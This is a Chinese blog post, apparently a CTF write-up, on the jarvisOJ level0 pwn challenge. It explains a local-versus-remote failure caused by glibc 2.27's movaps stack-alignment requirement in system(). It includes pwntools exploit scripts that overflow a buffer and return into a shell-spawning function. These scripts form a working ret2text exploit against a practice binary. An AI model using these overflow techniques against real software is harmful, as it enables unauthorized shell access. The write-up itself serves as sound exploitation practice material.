---
title: 关于jarvisOJ level0远程打得通本地打不通的问题
abbrlink: 31428
url: /posts/31428.html
date: 2020-07-30 18:31:33
tags:
---

今天给学弟演示最简单的pwn题的时候居然翻车了，没想到还是这个xmm寄存器的问题，我tcl，记录一下。
原来的exp是这样。
就是很简单的调用这个callsystem
![在这里插入图片描述](/images/64dcf12c98397e7da173b0c9d44bf40d.png)

结果本地打不通。试了下远程，发现能打通，太奇怪了。
```python
from pwn import*  
r=gdb.debug("./pwn_02","b* 0x00400597")  
#r=remote("52.82.121.166", 28068)
#r=process("./pwn_02")
pad=b'a'*0x88  
add=p64(0x400596)
payload=pad+add  
print(r.recv())
r.send(payload)  
r.interactive()  
```

通过gdb调试发现，跳到这里就断了。
![在这里插入图片描述](/images/23ef1e998ef31eb8045330c7e3288af8.png)
我本地调试系统是ubuntu 18，在bin群里问了问，组长肥猫嘤嘤告诉我是xmm寄存器的问题，当glibc版本大于2.27的时候，系统调用system("/bin/sh")之前有个xmm寄存器使用。要确保rsp是与16对齐的，也就是末尾必须是0.
![在这里插入图片描述](/images/c14df87d598268b0f355bac35ae62984.jpeg)
![在这里插入图片描述](/images/cfa3a70fb1673f348f9c8eb0d5272ce8.jpeg)
由于xmm寄存器是128bit又用了movaps指令，故必须让rsp的地址能够整除16，解决方法就是少push一个寄存器。
![在这里插入图片描述](/images/f3359b58a8c19b8fecf74aa2d63f3a27.jpeg)
让指令跳转到400597，本地exp如下：
```python
from pwn import*  
r=gdb.debug("./pwn_02","b* 0x00400597")  
#r=remote("52.82.121.166", 28068)
#r=process("./pwn_02")
pad=b'a'*0x88  
add=p64(0x400597)
payload=pad+add  
print(r.recv())
r.send(payload)  
r.interactive()  
```
使用`cat /proc/version`发现我的本地调试环境是ubuntu 18而jarvis oj本地的环境也是ubuntu18 那么为什么会不同呢，就是glibc版本的问题，使用
```bash
ldd --version
```
查看发现我的glibc版本是
```bash
ldd (Ubuntu GLIBC 2.27-3ubuntu1.2) 2.27
```
jarvisOJ的版本是：
```bash
ldd (Ubuntu EGLIBC 2.19-0ubuntu6.15) 2.19
```
看来就是libc的问题，与系统版本无关。
